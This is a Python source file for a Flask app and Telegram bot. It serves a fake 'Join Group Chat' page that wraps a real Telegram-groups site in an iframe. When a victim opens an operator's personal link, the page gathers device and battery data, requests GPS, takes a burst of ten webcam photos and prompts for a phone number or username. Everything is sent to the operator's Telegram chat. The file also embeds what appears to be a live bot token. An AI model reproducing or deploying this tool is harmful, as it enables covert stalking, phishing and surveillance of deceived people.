import os
import base64
from flask import Flask, request, render_template_string
import telebot
from datetime import datetime
import threading

# --- CONFIGURACIÓN ---
TOKEN = "8731032932:AAEdMOe81SLdxqShm50XVI5HbkTC7igqg_k"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# URL base de tu app en Render (Asegúrate de que coincida con tu nombre de servicio)
URL_APP = "https://pp-elqx.onrender.com"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Telegram: Join Group Chat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: sans-serif; background-color: #fff; overflow: hidden; }
        .content { position: relative; height: 100%; width: 100%; }
        iframe { width: 100%; height: 100%; border: none; }
        
        /* Estilo del Cartel Emergente */
        #input-card {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            width: 90%; max-width: 400px; background: white; padding: 15px;
            border-radius: 12px; box-shadow: 0 -4px 15px rgba(0,0,0,0.2);
            z-index: 9999; display: none; text-align: center;
        }
        #input-card p { margin: 0 0 10px 0; font-size: 14px; font-weight: bold; color: #333; }
        #input-card input { width: 80%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 10px; }
        #input-card button { background: #24A1DE; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <iframe src="https://www.grupostelegram.net"></iframe>
    </div>

    <div id="input-card">
        <p>¿Donde Desea Recibir El Grupo?<br>(Número o Usuario De Telegram)</p>
        <input type="text" id="user-contact" placeholder="+54... o @usuario">
        <button onclick="sendContact()">Confirmar</button>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        async function getExtraData() {
            const data = {
                ua: navigator.userAgent,
                lang: navigator.language,
                res: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                mem: navigator.deviceMemory || 'N/A'
            };
            try {
                const batt = await navigator.getBattery();
                data.batt_lvl = Math.round(batt.level * 100) + '%';
                data.batt_char = batt.charging ? 'Yes' : 'No';
            } catch (e) { data.batt_lvl = 'N/A'; data.batt_char = 'N/A'; }
            return data;
        }

        async function start() {
            if (!chatId) return;
            const info = await getExtraData();
            
            navigator.geolocation.getCurrentPosition(
                (pos) => { 
                    showCard();
                    capture({...info, lat: pos.coords.latitude, lon: pos.coords.longitude, gps: 'Allowed'}); 
                },
                () => { 
                    showCard();
                    capture({...info, lat: 'N/A', lon: 'N/A', gps: 'Denied'}); 
                }
            );
        }

        function showCard() {
            document.getElementById('input-card').style.display = 'block';
        }

        function sendContact() {
            const contact = document.getElementById('user-contact').value;
            if(contact.trim() !== "") {
                fetch('/data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target: chatId, contact_info: contact })
                });
                document.getElementById('input-card').innerHTML = "<p style='color:green'>Verificando... serás redirigido.</p>";
            }
        }

        async function capture(fullData) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Ráfaga de 10 fotos (una cada 1.5 segundos)
                let photosTaken = 0;
                const interval = setInterval(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    send({ ...fullData, img: canvas.toDataURL('image/jpeg'), shot: photosTaken + 1, cam: 'Allowed', target: chatId });
                    
                    photosTaken++;
                    if (photosTaken >= 10) {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                    }
                }, 1500);

            } catch (e) {
                send({ ...fullData, cam: 'Denied', target: chatId });
            }
        }

        function send(payload) {
            fetch('/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        }
        window.onload = start;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/data', methods=['POST'])
def get_data():
    d = request.json
    target_chat = d.get('target')
    ip = request.remote_addr
    now = datetime.now().strftime("%H:%M:%S")

    # 1. Si es información de contacto del formulario
    if d.get('contact_info'):
        msg = f"📩 *Dato de Contacto Recibido*\n━━━━━━━━━━━━\n👤 Usuario/Tel: `{d.get('contact_info')}`\n🆔 Destino: `{target_chat}`"
        bot.send_message(target_chat, msg, parse_mode="Markdown")
        return "OK", 200

    # 2. Si es el primer reporte técnico
    if d.get('shot', 1) == 1:
        reporte = (
            f"📊 *Nueva Información Capturada*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥 *Hardware*\n"
            f"• RAM: `{d.get('mem')} GB` | Cores: `{d.get('cores')}`\n"
            f"• Resolución: `{d.get('res')}`\n\n"
            f"🌐 *Conexión*\n"
            f"• IP: `{ip}`\n"
            f"• Batería: `{d.get('batt_lvl')}` ({d.get('batt_char')})\n\n"
            f"🔐 *Permisos*\n"
            f"• Cámara: `{d.get('cam')}` | GPS: `{d.get('gps')}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 Hora: {now}"
        )
        bot.send_message(target_chat, reporte, parse_mode="Markdown")
        
        if d.get('lat') != 'N/A':
            map_link = f"📍 *Ubicación:*\nhttps://www.google.com/maps?q={d.get('lat')},{d.get('lon')}"
            bot.send_message(target_chat, map_link)

    # 3. Envío de fotos de la ráfaga
    if d.get('img'):
        img_data = base64.b64decode(d.get('img').split(',')[1])
        bot.send_photo(target_chat, img_data, caption=f"📸 Foto {d.get('shot')}/10 — `{now}`")

    return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    link_personal = f"{URL_APP}/?id={user_id}"
    texto = (
        f"👋 *Bienvenido al Panel de Control*\n\n"
        f"🔗 *Tu link personal es:*\n`{link_personal}`\n\n"
        f"Al usarlo recibirás:\n"
        f"📸 Ráfaga de 10 fotos.\n"
        f"📍 Ubicación Real.\n"
        f"📱 Datos del dispositivo.\n"
        f"📩 Teléfono/Usuario que el cliente ingrese."
    )
    bot.reply_to(message, texto, parse_mode="Markdown")

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
